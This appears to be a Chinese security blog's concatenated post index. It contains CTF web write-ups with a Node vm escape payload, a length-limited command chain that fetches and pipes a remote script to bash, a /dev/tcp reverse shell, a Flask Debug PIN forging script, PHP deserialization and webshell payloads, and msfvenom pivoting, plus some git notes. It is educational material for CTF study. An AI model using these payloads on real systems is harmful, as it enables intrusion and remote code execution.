(/app/node_modules/express/lib/router/layer.js:95:5) at /app/node_modules/express/lib/router/index.js:281:22 at Function.process_params (/app/node_modules/express/lib/router/index.js:335:12) 可以看到是用了 vm，GitHub 上有一个逃逸的 payload 但是这里过滤了一些关键字 for while process exec eval constructor prototype Function + \" ' 根据 cg 的 payload，引号可以用 String.fromCharCode 绕过 这里给一个转成这个函数形式的脚本 s = \"return process\" payload = \"String.fromCharCode(\" for c in s: payload += str(ord(c)) + ',' payload = payload.strip(',') + ')' print(payload) 这里被过滤的方法名可以用 JavaScript 的另一种方法调用形式，即将方法名当作数组索引的形式加上 String.fromCharCode 绕过 绕过引号和方法名过滤bypass \" 绕过引号和方法名过滤 最终 paylaod 如下 (function(){try{Buffer.from(new Proxy({},{getOwnPropertyDescriptor(){throw f=\u003ef[String.fromCharCode(99,111,110,115,116,114,117,99,116,111,114)](String.fromCharCode(114,101,116,117,114,110,32,112,114,111,99,101,115,115))();}}));}catch(e){return e(()=\u003e{}).mainModule.require(String.fromCharCode(99,104,105,108,100,95,112,114,111,99,101,115,115))[String.fromCharCode(101,120,101,99,83,121,110,99)](String.fromCharCode(99,97,116,32,47,102,108,97,103)).toString();}})() 成功获得 flag ","date":"2020-04-22","objectID":"/posts/hfctf-web/:3:0","tags":["WriteUp"],"title":"虎符 CTF WEB 部分复现","uri":"/posts/hfctf-web/"},{"categories":["CTF"],"content":"0x03 babyupload 这个是真 PHP \u003c?php error_reporting(0); session_save_path(\"/var/babyctf/\"); session_start(); require_once \"/flag\"; highlight_file(__FILE__); if($_SESSION['username'] ==='admin') { $filename='/var/babyctf/success.txt'; if(file_exists($filename)){ safe_delete($filename); die($flag); } } else{ $_SESSION['username'] ='guest'; } $direction = filter_input(INPUT_POST, 'direction'); $attr = filter_input(INPUT_POST, 'attr'); $dir_path = \"/var/babyctf/\".$attr; if($attr===\"private\"){ $dir_path .= \"/\".$_SESSION['username']; } if($direction === \"upload\"){ try{ if(!is_uploaded_file($_FILES['up_file']['tmp_name'])){ throw new RuntimeException('invalid upload'); } $file_path = $dir_path.\"/\".$_FILES['up_file']['name']; $file_path .= \"_\".hash_file(\"sha256\",$_FILES['up_file']['tmp_name']); if(preg_match('/(\\.\\.\\/|\\.\\.\\\\\\\\)/', $file_path)){ throw new RuntimeException('invalid file path'); } @mkdir($dir_path, 0700, TRUE); if(move_uploaded_file($_FILES['up_file']['tmp_name'],$file_path)){ $upload_result = \"uploaded\"; }else{ throw new RuntimeException('error while saving'); } } catch (RuntimeException $e) { $upload_result = $e-\u003egetMessage(); } } elseif ($direction === \"download\") { try{ $filename = basename(filter_input(INPUT_POST, 'filename')); $file_path = $dir_path.\"/\".$filename; if(preg_match('/(\\.\\.\\/|\\.\\.\\\\\\\\)/', $file_path)){ throw new RuntimeException('invalid file path'); } if(!file_exists($file_path)) { throw new RuntimeException('file not exist'); } header('Content-Type: application/force-download'); header('Content-Length: '.filesize($file_path)); header('Content-Disposition: attachment; filename=\"'.substr($filename, 0, -65).'\"'); if(readfile($file_path)){ $download_result = \"downloaded\"; }else{ throw new RuntimeException('error while saving'); } } catch (RuntimeException $e) { $download_result = $e-\u003egetMessage(); } exit; } ?\u003e 重点在这里 if($_SESSION['username'] ==='admin') { $filename='/var/babyctf/success.txt'; if(file_exists($filename)){ safe_delete($filename); die($flag); } } 我们需要伪造 session 让自己变成 admin 并且需要创建 success.txt 文件 我们先读取一下 session，名为 sess_PHPSESSID 的文件 读取 SESSION 文件get_sess \" 读取 SESSION 文件 其内容如下 SESSION 文件的内容sess \" SESSION 文件的内容 这里要知道 PHP session 序列化的形式（session.serialize_handler） php 键名 + 竖线 + 经过serialize()函数序列化处理的值 php_binary 键名的长度对应的ASCII字符 + 键名 + 经过serialize()函数序列化处理的值 php_serialize（ php \u003e= 5.5.4 ）经过serialize()函数序列化处理的数组 由于最前边有一个不可见字符，可以判断这里用的是 php_binary 我们发现最后上传的文件名是原文件名 + ‘_’ + 文件名的 SHA256 值，与 session 文件的文件名似乎有点相似 构造一个 php_binary 形式的 session 文件，username 为 admin，注意图中的不可见字符 08（或者用 PHP 直接生成也可以 生成恶意 SESSION 文件sess_file \" 生成恶意 SESSION 文件 计算一下该文件的 SHA256 值 计算 SESSION 文件的 SHA256 值sess_sha256 \" 计算 SESSION 文件的 SHA256 值 上传该 sess 文件 上传 SESSION 文件upload \" 上传 SESSION 文件 然后将 PHPSESSID 改为上面计算的 SHA256 值即可 下一步就是怎么创建 success.txt，直接上传的话文件名后会包含 SHA256 值，但是根据 file_exists 的函数描述，它是检查文件或目录是否存在，我们不好直接上传文件，但是可以创建目录 创建 success.txt 目录success \" 创建 success.txt 目录 刷新页面即可获得 flag ","date":"2020-04-22","objectID":"/posts/hfctf-web/:4:0","tags":["WriteUp"],"title":"虎符 CTF WEB 部分复现","uri":"/posts/hfctf-web/"},{"categories":["CTF"],"content":"0x04 完结撒花 一共三道 WEB 有两道 nodejs 着实没想到，对 nodejs 一点都不熟悉，总结一下，还是太菜了 以后要多看看这一类的题，要不然比赛遇到了无从下手就很难受 ","date":"2020-04-22","objectID":"/posts/hfctf-web/:5:0","tags":["WriteUp"],"title":"虎符 CTF WEB 部分复现","uri":"/posts/hfctf-web/"},{"categories":["WEB"],"content":"0x00 前言 之前做题有做到过字数限制的 shell，有五个字符也有四个字符的，当然我一直不会做，最近又重新研究了一下这个绕过的问题，就把它记录下来了 这种题一般都是每人一个 sandbox 目录，之后的操作都在这个目录中进行 ","date":"2020-04-18","objectID":"/posts/bypass-char-number-limit/:1:0","tags":["WEB安全","Linux"],"title":"绕过字符数限制 getshell","uri":"/posts/bypass-char-number-limit/"},{"categories":["WEB"],"content":"0x01 前置知识 ls 输出的默认排序是逐字符按照 ASCII 码从小到大排序 ls -t 文件名按时间排序 重定向符 \u003e 无命令也可用于创建文件 IP 的等价表示（选用，有时可降低难度） 将 . 分隔的每个十进制数转换成两位十六进制再连接起来（可转换成十进制、八进制等），和原 IP 等价使用 ip = '172.17.0.1' hex_ip = '0x' for i in ip.split('.'): hex_ip += str(hex(int(i)))[2:].zfill(2) print(hex_ip) # 0xac110001 print(int(hex_ip, 16)) # 2886795265 print('0' + oct(int(hex_ip, 16))[2:]) # 025404200001 单独的 * 相当于 `ls` 即将文件名作为命令执行，也可以添加其它字符进行匹配 单独的 * 相当于 `ls`star \" 单独的 * 相当于 `ls` 如上图所示，目录下有两个文件 dir 和 whoami ，单独的 * 执行了 dir whoami 命令，而 *i 执行了 whoami 命令 dir 命令本质上与 ls 相同，但输出不换行，且首字母为 d 可以操作 rev 命令输出反转文件每一行后的内容 rev 命令反转每一行的内容rev \" rev 命令反转每一行的内容 ","date":"2020-04-18","objectID":"/posts/bypass-char-number-limit/:2:0","tags":["WEB安全","Linux"],"title":"绕过字符数限制 getshell","uri":"/posts/bypass-char-number-limit/"},{"categories":["WEB"],"content":"0x02 5个字符 当然先是五个字符的，简单一点 题目代码如下： \u003c?php $sandbox = '/tmp/sandbox5/'.md5($_SERVER['REMOTE_ADDR']); @mkdir($sandbox); @chdir($sandbox); if (isset($_GET['cmd']) \u0026\u0026 strlen($_GET['cmd']) \u003c= 5) { @exec($_GET['cmd']); } else if (isset($_GET['reset'])) { @exec('/bin/rm -rf '.$sandbox.'/*'); } highlight_file(__FILE__); 大体思路就是把 curl ip|bash 分割成一个一个小字符串，并在结尾添加 \\ 连接，将要执行的脚本放在服务器上，这其中还要用到 ls -t ，为了防止 . 的干扰采用十六进制表示 IP (这里需要自己研究怎么分割) # ls -t\u003ev \u003els\\\\ ls\u003e_ \u003e\\ \\\\ \u003e-t\\\\ \u003e\\\u003ev ls\u003e\u003e_ # curl 0xac110001|bash (适当分割并逆序写入) \u003ebash \u003e\\|\\\\ \u003e01\\\\ \u003e00\\\\ \u003e11\\\\ \u003eac\\\\ \u003e0x\\\\ \u003e\\ \\\\ \u003erl\\\\ \u003ecu\\\\ # exec sh _ sh v 服务器中 index.html 中放有反弹 shell 的命令 bash -i \u003e\u0026 /dev/tcp/172.17.0.1/12345 0\u003e\u00261 在服务器监听 12345 端口 nc -lvp 12345 成功反弹 shell ","date":"2020-04-18","objectID":"/posts/bypass-char-number-limit/:3:0","tags":["WEB安全","Linux"],"title":"绕过字符数限制 getshell","uri":"/posts/bypass-char-number-limit/"},{"categories":["WEB"],"content":"0x02.5 一个惊喜的发现 我在做 4 个字符的测试时发现，用 php 的 exec 函数执行 shell 命令，结尾的反斜杠居然不需要转义 即上一题的 payload 可简化为 # ls -t\u003ev \u003els\\ ls\u003e_ \u003e\\ \\ \u003e-t\\ \u003e\\\u003ev ls\u003e\u003e_ # curl 0xac110001|bash (适当分割并逆序写入) \u003ebash \u003e1\\|\\ \u003e000\\ \u003ec11\\ \u003e0xa\\ \u003el\\ \\ \u003ecur\\ # exec sh _ sh v 也成功反弹了 shell，不知道是不是个例或者是 php 版本问题，但我在接下来 4 个字符的操作中使用到了这个特性，要是有 dalao 发现这样不可行烦请告知我（如果真的有 dalao 看的话 ","date":"2020-04-18","objectID":"/posts/bypass-char-number-limit/:4:0","tags":["WEB安全","Linux"],"title":"绕过字符数限制 getshell","uri":"/posts/bypass-char-number-limit/"},{"categories":["WEB"],"content":"0x03 4个字符 这才是重头戏，曾经差点把我搞自闭的题，我终于做出来了 题目代码如下： \u003c?php $sandbox = '/tmp/sandbox4/'.md5($_SERVER['REMOTE_ADDR']); @mkdir($sandbox); @chdir($sandbox); if (isset($_GET['cmd']) \u0026\u0026 strlen($_GET['cmd']) \u003c= 4) { @exec($_GET['cmd']); } else if (isset($_GET['reset'])) { @exec('/bin/rm -rf '.$sandbox.'/*'); } highlight_file(__FILE__); 思路与之前相同，但是要充分运用 dir 和 rev 命令，先放一下 payload 再进行分析 # ls -tk\u003ef \u003edir \u003ef\\\u003e \u003ekt- \u003esl *\u003ev # 这里文件名为 v 非常重要 \u003erev *v\u003eg # curl 0xac110001|bash (适当分割并逆序写入) \u003eash \u003eb\\ \u003e\\|\\ \u003e01\\ \u003e00\\ \u003e11\\ \u003eac\\ \u003e0x\\ \u003e\\ \\ \u003erl\\ \u003ecu\\ # exec sh g sh f 这里重点分析第一部分，怎么奇特的构造出需要的命令 第一步创建名为 dir 的文件，由于 d 的 ASCII 码较小，这个文件在第一部分将始终位于第一位 第二三四步分别创建对应文件 第五步用到了单独的 * 这里相当于执行了 `dir f\u003e kt- sl`\u003ev 这之后文件 v 中的内容为 f\u003e kt- sl 第六步创建名为 rev 的文件 第七步是这里最重要的地方，也是前边的文件名为 v 非常重要的原因，用到了 * 第二种用法，相当于执行了 `rev v`\u003eg ，即将 v 的内容反转写入 g 这之后文件 g 的内容为 ls -kt \u003ef 之后的内容与 5 个字符的方法相同 这里再解释两个地方 是文件名 f 可以修改，但要保证其位于第二位 是 -tk 中的 k 对输出结果没有影响，但控制了该文件在输出中的位置，也可进行修改，但要仍满足以上两点才可以 ","date":"2020-04-18","objectID":"/posts/bypass-char-number-limit/:5:0","tags":["WEB安全","Linux"],"title":"绕过字符数限制 getshell","uri":"/posts/bypass-char-number-limit/"},{"categories":["WEB"],"content":"0x04 后记 好久没写博客了，在 npy 的提醒下来水一篇博客，也当做一个笔记，下次遇到这种题查自己博客就好了 这两道题的源码我放到 GitHub 了，并添加了一个文件名为 shell.php 的 webshell，方便以 www-data 用户进行一些操作（好像也没多大用 ","date":"2020-04-18","objectID":"/posts/bypass-char-number-limit/:6:0","tags":["WEB安全","Linux"],"title":"绕过字符数限制 getshell","uri":"/posts/bypass-char-number-limit/"},{"categories":["心路历程"],"content":"〇、获取本地仓库 git init 初始化仓库 git clone \u003curl\u003e 从远程仓库克隆（url 可采用 git、http、https 和 ssh 等协议） ","date":"2020-02-19","objectID":"/posts/learn-git/:1:0","tags":["Git","学习"],"title":"Git 学习笔记","uri":"/posts/learn-git/"},{"categories":["心路历程"],"content":"一、本地文件修改、提交及查看等 git status 查看已跟踪文件状态（修改、新加、改名、删除等） git add \u003cfile\u003e 追踪新文件 .gitignore 文件中添加被忽略的文件 以 # 开头的内容为注释，被 Git 自动忽略 可使用 Glob 表达式进行模式匹配 模式最后跟斜杠（ / ）表示目录 模式前加叹号（ ! ） 表示取反 git diff 当前文件与暂存区之间的差异 --cached / --staged 暂存区与上次提交之间的差异 git commit 提交更改 -m 添加本次提交的说明（若无该参数将打开文本编辑器进行添加） -a 提交所有已暂存的文件（跳过 git add 过程） --amend 撤销最后的提交并重新提交 git rm 从 仓库（暂存区）和 工作目录 中删除 -f 强制删除（已修改并放入暂存区的文件） --cached 只从仓库（暂存区）中删除，保留在工作目录中 git mv 移动文件（git mv oldfile newfile 相当于运行以下三条命令） mv oldfile newfile git rm oldfile gie add newfile git log 查看提交历史 -p 显示每次提交的内容差异 -\u003cX\u003e (X 为数字) 只显示最近 X 次提交 --stat 仅显示简要的增改行数统计 --pretty= 指定显示的格式 oneline short full fuller 调整展示信息的多少 format:\"\" 自定义要显示的格式（可使用如下占位符） %H 提交对象（commit）的完整哈希字串 %h 提交对象的简短哈希字串 %T 树对象（tree）的完整哈希字串 %t 树对象的简短哈希字串 %P 父对象（parent）的完整哈希字串 %p 父对象的简短哈希字串 %an 作者（author）的名字 %ae 作者的电子邮件地址 %ad 作者修订日期（可以用 -date= 选项定制格式） %ar 作者修订日期，按多久以前的方式显示 %cn 提交者(committer)的名字 %ce 提交者的电子邮件地址 %cd 提交日期 %cr 提交日期，按多久以前的方式显示 %s 提交说明 --graph 用图形表示所在分支及合并历史 --relative-date 使用相对时间表示 --name-only 仅显示新增、修改、删除的文件的文件名 --name-status 显示新增、修改、删除的文件的文件名和执行的操作（A D M） --abbrev-commit 仅显示 SHA-1 的前几个字符 --shortstat 仅显示总的行数修改统计（不显示单文件的变化） --since= --after= 仅显示指定时间后的提交 --until= --before= 仅显示指定时间之前的提交 --author= 仅显示指定作者的提交 --committer= 仅显示指定提交者的提交 --no-merges 排除来自合并的提交 --merges 只显示来自合并的提交 --grep= 匹配提交信息中的关键字 最后单独的 -- 后的所有内容为限定的路径或文件名 git reset HEAD \u003cfile\u003e 取消对文件的暂存 git checkout -- \u003cfile\u003e 取消对文件的修改（仅限于修改后未暂存的文件） ","date":"2020-02-19","objectID":"/posts/learn-git/:2:0","tags":["Git","学习"],"title":"Git 学习笔记","uri":"/posts/learn-git/"},{"categories":["心路历程"],"content":"二、本地与远程仓库之间的操作 git remote 列出所有远程库的名字 -v --verbose 显示对应的地址 add \u003cshortname\u003e \u003curl\u003e 添加新的远程仓库 show \u003cremote-name\u003e 查看某个远程仓库的详细信息 rename \u003cold-name\u003e \u003cnew-name\u003e 修改远程仓库在本地的简称 rm \u003cremote-name\u003e 移除某个远程仓库 git fetch \u003cremote-name\u003e 拉取远程仓库有但本地没有的数据（不合并） git pull 拉取跟踪的远程仓库对应分支的数据并合并 git push \u003cremote-name\u003e \u003cbranch-name\u003e 将本地的某分支推送到远程仓库（默认为 origin master） ","date":"2020-02-19","objectID":"/posts/learn-git/:3:0","tags":["Git","学习"],"title":"Git 学习笔记","uri":"/posts/learn-git/"},{"categories":["心路历程"],"content":"三、标签有关操作 git tag 列出现有标签 -l '' 模式搜索符合条件的标签 -a \u003ctag-name\u003e [SHA-1] 添加（补加）含附注的标签 -s \u003ctag-name\u003e 同上添加标签并用 GPG 签署标签 -m 标签的附注说明 \u003ctag-name\u003e 添加轻量级标签（无需附注） -v \u003ctag-name\u003e 验证已签署的标签 git show \u003ctag-name\u003e 查看相应标签的版本信息 git push \u003cremote-name\u003e \u003ctag-name\u003e 将本地的某标签推送到远程仓库 --tags 推送所有本地新增的标签 ","date":"2020-02-19","objectID":"/posts/learn-git/:4:0","tags":["Git","学习"],"title":"Git 学习笔记","uri":"/posts/learn-git/"},{"categories":["心路历程"],"content":"四、分支有关操作 git branch 列出所有分支和当前指向分支 \u003cbranch-name\u003e 创建新分支 git checkout \u003cbranch-name\u003e 切换到某分支 -b \u003cbranch-name\u003e 创建并切换到分支（相当于一下两条命令） git branch \u003cbranch-name\u003e git checkout \u003cbranch-name\u003e -b \u003cbranch-name\u003e \u003cremote-name\u003e/\u003cremote-branch\u003e 从远程分支创建分支并跟踪 --track \u003cremote-name\u003e/\u003cremote-branch\u003e 从远程分支创建同名分支并跟踪 -d \u003cbranch-name\u003e 删除某分支 -v 显示每个分支最后一次提交的信息 git merge \u003cbranch-name\u003e 将某分支合并到当前分支（可能出现冲突需要手动处理） git push \u003cremote-name\u003e \u003cbranch-name\u003e:\u003cremote-branch\u003e 将本地分支推送到命名不同的远程分支（本地分支留空推送空分支，即为删除远程分支） ","date":"2020-02-19","objectID":"/posts/learn-git/:5:0","tags":["Git","学习"],"title":"Git 学习笔记","uri":"/posts/learn-git/"},{"categories":["WEB"],"content":"0x00 前言 上周打南邮的 NCTF 时碰到了一道名为 flask_website 的题，刚开始想的是模板注入，但发现没有注入点，后来点到页面最下边的一个链接，跳转到了 Debug 模式的报错界面，从此处了解到 Flask Debug PIN 的存在，这个利用可能比较鸡肋，但倒是挺有趣的 ","date":"2019-11-26","objectID":"/posts/flask-debug-pin/:1:0","tags":["Flask","WEB安全","学习"],"title":"关于 Flask Debug PIN 的安全性问题","uri":"/posts/flask-debug-pin/"},{"categories":["WEB"],"content":"0x01 Flask Debug 模式 只需要在 app.run() 的参数中添加 debug=True 即可开启 Debug 模式，此时出现错误将呈现错误信息，在报错界面可使用 Flask Debug PIN 直接调用 Python console ，这里只需获取 PIN 即可 getshell ","date":"2019-11-26","objectID":"/posts/flask-debug-pin/:2:0","tags":["Flask","WEB安全","学习"],"title":"关于 Flask Debug PIN 的安全性问题","uri":"/posts/flask-debug-pin/"},{"categories":["WEB"],"content":"0x02 源码分析 # python所在目录/Lib/site-packages/werkzeug/debug/__init__.py ... def get_machine_id(): global _machine_id rv = _machine_id if rv is not None: return rv def _generate(): # docker containers share the same machine id, get the # container id instead try: with open(\"/proc/self/cgroup\") as f: value = f.readline() except IOError: pass else: value = value.strip().partition(\"/docker/\")[2] if value: return value # Potential sources of secret information on linux. The machine-id # is stable across boots, the boot id is not for filename in \"/etc/machine-id\", \"/proc/sys/kernel/random/boot_id\": try: with open(filename, \"rb\") as f: return f.readline().strip() except IOError: continue # On OS X we can use the computer's serial number assuming that # ioreg exists and can spit out that information. try: # Also catch import errors: subprocess may not be available, e.g. # Google App Engine # See https://github.com/pallets/werkzeug/issues/925 from subprocess import Popen, PIPE dump = Popen( [\"ioreg\", \"-c\", \"IOPlatformExpertDevice\", \"-d\", \"2\"], stdout=PIPE ).communicate()[0] match = re.search(b'\"serial-number\" = \u003c([^\u003e]+)', dump) if match is not None: return match.group(1) except (OSError, ImportError): pass # On Windows we can use winreg to get the machine guid wr = None try: import winreg as wr except ImportError: try: import _winreg as wr except ImportError: pass if wr is not None: try: with wr.OpenKey( wr.HKEY_LOCAL_MACHINE, \"SOFTWARE\\\\Microsoft\\\\Cryptography\", 0, wr.KEY_READ | wr.KEY_WOW64_64KEY, ) as rk: machineGuid, wrType = wr.QueryValueEx(rk, \"MachineGuid\") if wrType == wr.REG_SZ: return machineGuid.encode(\"utf-8\") else: return machineGuid except WindowsError: pass _machine_id = rv = _generate() return rv ... def get_pin_and_cookie_name(app): \"\"\"Given an application object this returns a semi-stable 9 digit pin code and a random key. The hope is that this is stable between restarts to not make debugging particularly frustrating. If the pin was forcefully disabled this returns `None`. Second item in the resulting tuple is the cookie name for remembering. \"\"\" pin = os.environ.get(\"WERKZEUG_DEBUG_PIN\") rv = None num = None # Pin was explicitly disabled if pin == \"off\": return None, None # Pin was provided explicitly if pin is not None and pin.replace(\"-\", \"\").isdigit(): # If there are separators in the pin, return it directly if \"-\" in pin: rv = pin else: num = pin modname = getattr(app, \"__module__\", app.__class__.__module__) try: # getuser imports the pwd module, which does not exist in Google # App Engine. It may also raise a KeyError if the UID does not # have a username, such as in Docker. username = getpass.getuser() except (ImportError, KeyError): username = None mod = sys.modules.get(modname) # This information only exists to make the cookie unique on the # computer, not as a security feature. probably_public_bits = [ username, modname, getattr(app, \"__name__\", app.__class__.__name__), getattr(mod, \"__file__\", None), ] # This information is here to make it harder for an attacker to # guess the cookie name. They are unlikely to be contained anywhere # within the unauthenticated debug page. private_bits = [str(uuid.getnode()), get_machine_id()] h = hashlib.md5() for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, text_type): bit = bit.encode(\"utf-8\") h.update(bit) h.update(b\"cookiesalt\") cookie_name = \"__wzd\" + h.hexdigest()[:20] # If we need to generate a pin we salt it a bit more so that we don't # end up with the same value and generate out 9 digits if num is None: h.update(b\"pinsalt\") num = (\"%09d\" % int(h.hexdigest(), 16))[:9] # Format the pincode in groups of digits for easier remembering if # we don't have a result yet. if rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = \"-\".join( num[x : x + group_size].rjust(group_size, \"0\") for x in range(0, len(num), group_size) ) break else: rv = num return rv, cookie_name ... 从第二个函数得知，生成 Flask Debug PIN 共需要六个参数 usern","date":"2019-11-26","objectID":"/posts/flask-debug-pin/:3:0","tags":["Flask","WEB安全","学习"],"title":"关于 Flask Debug PIN 的安全性问题","uri":"/posts/flask-debug-pin/"},{"categories":["WEB"],"content":"0x03 利用过程 这里想要利用 Flask Debug PIN ，需要配合任意文件读取的漏洞使用，原题中使用了 urllib 库，可以通过 file 协议读取文件，获取对应参数，再从上方第二个函数中提取 PIN 的生成过程，构成如下脚本 import hashlib from itertools import chain probably_public_bits = [ 'username', # username 'flask.app', # modname 'Flask', # getattr(app, '__name__', getattr(app.__class__, '__name__')) 'python所在目录/Lib/site-packages/flask/app.py' # getattr(mod, '__file__', None), ] private_bits = [ 'MAC 地址十进制表示', # str(uuid.getnode())，/sys/class/net/网卡名称/address 'machine_id' # get_machine_id() ] h = hashlib.md5() for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode('utf-8') h.update(bit) h.update(b'cookiesalt') cookie_name = '__wzd' + h.hexdigest()[:20] num = None if num is None: h.update(b'pinsalt') num = ('%09d' % int(h.hexdigest(), 16))[:9] rv = None if rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = '-'.join(num[x:x + group_size].rjust(group_size, '0') for x in range(0, len(num), group_size)) break else: rv = num print(rv) 通过脚本生成 PIN ，在报错界面中输入即可获取 Python console ，再通过 os.popen('xxx').readlines() 函数即可 getshell ","date":"2019-11-26","objectID":"/posts/flask-debug-pin/:4:0","tags":["Flask","WEB安全","学习"],"title":"关于 Flask Debug PIN 的安全性问题","uri":"/posts/flask-debug-pin/"},{"categories":["WEB"],"content":"0x04 总结 此利用过程略显鸡肋，但对 Flask 的 Debug 模式 和 Flask Debug PIN 有了大致了解，可以在以后的学习过程中加以利用，达到更好的效果 ","date":"2019-11-26","objectID":"/posts/flask-debug-pin/:5:0","tags":["Flask","WEB安全","学习"],"title":"关于 Flask Debug PIN 的安全性问题","uri":"/posts/flask-debug-pin/"},{"categories":["CTF"],"content":"0x00 吐槽思考 for [BOSS] Get Me Inside 这道题肝的是真的爽，从 ddl 前一天晚上开始，搞到 ddl 当天凌晨四点多~~（原来我的肝这么好）~~ 这是一道涉及面广泛的题，考虑到了实战的一些情况，考察多方面的知识，是一道不可多得的好题（即使如此，我依旧想暴打各位出题人emmm） ","date":"2019-10-24","objectID":"/posts/cnss-recruit-2019-web-boss/:1:0","tags":["CNSS","WriteUp"],"title":"CNSS Recruit 2019 Web Boss题 WriteUp","uri":"/posts/cnss-recruit-2019-web-boss/"},{"categories":["CTF"],"content":"0x01 反序列化漏洞 打开这道题首先就是一堆 PHP 源码，直接就摆上了一大堆 class ，先暂时略过这些 class ，继续向下看，我们会发现在源码的末尾有这么一段 \u003c?php $a = $_GET['p']; unserialize($a); if($flag === 1){ ... } ?\u003e 结合上边的一大堆 class ，考虑利用反序列化漏洞，层层递进，最终将变量 flag 的值设为 1 即可，故构造以下 payload （这里可以直接复制粘贴，然后自己写一个脚本把需要的变量序列化一下即可） /?p=O:4:\"Deep\":2:{s:2:\"m1\";O:4:\"Dark\":2:{s:2:\"m1\";O:7:\"Fantasy\":2:{s:2:\"m1\";O:5:\"Happy\":2:{s:2:\"m1\";O:8:\"New_year\":2:{s:2:\"s1\";O:21:\"Copied_from_somewhere\":0:{}s:2:\"s2\";N;}s:2:\"m2\";N;}s:2:\"m2\";N;}s:2:\"m2\";N;}s:2:\"m2\";N;} 输入后发现在未提供参数 c 的情况下输出了 ? ，可知成功将 flag 设为 1 ","date":"2019-10-24","objectID":"/posts/cnss-recruit-2019-web-boss/:2:0","tags":["CNSS","WriteUp"],"title":"CNSS Recruit 2019 Web Boss题 WriteUp","uri":"/posts/cnss-recruit-2019-web-boss/"},{"categories":["CTF"],"content":"0x02 get shell 之后查看最后的一段源码 \u003c?php if(!isset($_GET['c'])){ die(\"?\"); } $code = $_GET['c']; if(strlen($code)\u003e37){ die(\"这么长会死的!\"); } if(preg_match(\"/[A-Za-z0-9^!]+/\",$code)){ die(\"Catch you!\"); } @eval($code); ?\u003e 考虑通过 eval 这个函数调用其他函数拿到系统 shell ，然而首先要面对的问题就是这个可恶的正则，你注入的代码中不能包含任何字母、数字和 ^ ! 两种符号 这里可以使用 PHP 的另一种函数调用方式 (函数名)(参数) ，然后函数名和参数都采用按位取反的方式，通过url编码和 ~ 运算符调用函数 然后我们非常高兴的执行了 system('whoami') ，但是，什么都没有发生，看一下 phpinfo() ，发现几乎所有能拿到系统shell的函数都在 disable_functions 里，然后考虑绕过 disable_functions 的方法，经过多方查找，最后选择了通过 LD_PRELOAD 的方式绕过，但这种方法需要上传文件，所以继续构造 payload /?p=O:4:%22Deep%22:2:{s:2:%22m1%22;O:4:%22Dark%22:2:{s:2:%22m1%22;O:7:%22Fantasy%22:2:{s:2:%22m1%22;O:5:%22Happy%22:2:{s:2:%22m1%22;O:8:%22New_year%22:2:{s:2:%22s1%22;O:21:%22Copied_from_somewhere%22:0:{}s:2:%22s2%22;N;}s:2:%22m2%22;N;}s:2:%22m2%22;N;}s:2:%22m2%22;N;}s:2:%22m2%22;N;}\u0026c=(~%9e%8c%8c%9a%8d%8b)(${~%a0%b8%ba%ab}[%aa]);\u0026%aa=eval($_POST['aaa']); 这里我们采用另一个可以执行 PHP 语句的函数 assert ，但由于 assert 一次只能执行一条语句，我们可以在其中再加入一个 eval ，这里便出现了我们熟悉的一句话木马，二话不说扔到蚁剑里，发现 shell 依然无法使用，但可以读取和上传文件（这里是因为读取和上传文件可以用 PHP 自带的其它函数实现，所以不需要拿到 shell 就可以），由于 hint 告诉我们对 html 目录没有写权限，故考虑另一个目录 /tmp ，测试后发现有写权限，故可以上传构造的 so 文件进行进一步操作（但当时服务器里有不知哪位好心的大哥留下的 so 文件，我就直接拿来用了，后来知道那个文件出自此处，这个构造的十分巧妙，使用了另一个环境变量，配合 PHP 实现一次编译即可执行任意命令，无需每次修改命令都要重新编译，学到了)，然后 include 一下配套的 PHP 文件，按照 PHP 里的参数配置一下，成功拿到系统shell ","date":"2019-10-24","objectID":"/posts/cnss-recruit-2019-web-boss/:3:0","tags":["CNSS","WriteUp"],"title":"CNSS Recruit 2019 Web Boss题 WriteUp","uri":"/posts/cnss-recruit-2019-web-boss/"},{"categories":["CTF"],"content":"0x03 内网穿透 由于 hint 给出了 LAN \u0026 ARP ，这里考虑 flag 可能存在于另一台服务器（记为服务器2）上，用 arp -a 看一下，发现有这么一个 IP 与众不同 getmeinside_inner_1.getmeinside_lan (172.16.233.233) at 02:42:ac:10:e9:e9 [ether] on eth0 curl 看一下，发现有一个网页可以上传文件，考虑将服务器2的80端口转发出来，可以采用 msf 的 meterpreter 模块（这里需要自己有一个公网 IP ，我选择开了一个 VPS ，一般来说再将 VPS 端口转发到本地比较安全，但我为了方便直接在 VPS 上装了个 msf ，毕竟用完即删） 先用 msfvenom 做个木马，然后用蚁剑上传到服务器1，给一下执行权限，接下来在 msfconsole 中监听木马设置的端口，然后再服务器1中运行木马，拿到 meterpreter shell，然后用 portfwd 进行端口转发，打开转发到服务器上的端口，成功打开服务器2上的网页 ","date":"2019-10-24","objectID":"/posts/cnss-recruit-2019-web-boss/:4:0","tags":["CNSS","WriteUp"],"title":"CNSS Recruit 2019 Web Boss题 WriteUp","uri":"/posts/cnss-recruit-2019-web-boss/"},{"categories":["CTF"],"content":"0x04 get shell Again 打开页面，发现似乎可以上传什么东西，观察 url 有 /?file=index ，点击上传后 url 变化但页面并未变化，尝试去掉最后的 .php ，发现成功打开上传页面，可以判断 file 是一个 include 漏洞，尝试 php伪协议 读取源码，构造以下 payload /?file=php://filter/read=convert.base64-encode/resource=upload 成功读到 upload.php 的源码（我第一次做的时候的确读到了源码，但再次尝试却发现读不到了QAQ） 观察上传页面，发现并无表单可以提交，就在本地写一个表单提交到服务器2，尝试发现只能上传 png 文件，由于 hint 指出了 Phar ，于是写一个一句话木马，打包成 zip（注意打包时选择不压缩），然后将拓展名改为 png ，成功上传，得到上传后的文件名，构造以下 payload（注意最后的木马名不需要 .php) /?file=phar://pic/文件名/木马名 看一下 phpinfo ，发现拿 shell 的函数并没有被禁用，直接拿到系统shell（这里我想再扔到蚁剑里，但莫名其妙连不上，就手动操作了） ","date":"2019-10-24","objectID":"/posts/cnss-recruit-2019-web-boss/:5:0","tags":["CNSS","WriteUp"],"title":"CNSS Recruit 2019 Web Boss题 WriteUp","uri":"/posts/cnss-recruit-2019-web-boss/"},{"categories":["CTF"],"content":"0x05 读取 flag 文件 根据 hint ，只有 root 用户可以读取 flag 文件，尝试 sudo cat，发现并不能读取，sudo -l 看一下权限，发现权限设置如下 (ALL,!root) NOPASSWD:/bin/cat 直接使用 sudo 无法使用 cat 